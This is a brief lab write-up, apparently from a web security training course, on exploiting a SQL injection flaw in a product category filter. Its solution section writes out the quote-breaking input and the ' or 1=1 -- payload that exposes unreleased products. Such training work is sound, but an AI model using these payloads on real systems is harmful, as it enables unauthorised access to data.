Lab 1
----------------
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.


Solution
----------------------------------------------------------------------------
Sql injection  - product categories filter 
SELECT * FROM products WHERE category = 'Gifts' AND  released = 1 
End Goal :  display all products both released and unreleased .

Analysis : 
SELECT * FROM products WHERE category = 'lifestyle' AND  released = 1 
SELECT * FROM products WHERE category =   ' ' '  AND  released = 1 
SELECT * FROM products WHERE category =   ' ' or 1=1 -- '  AND  released = 1
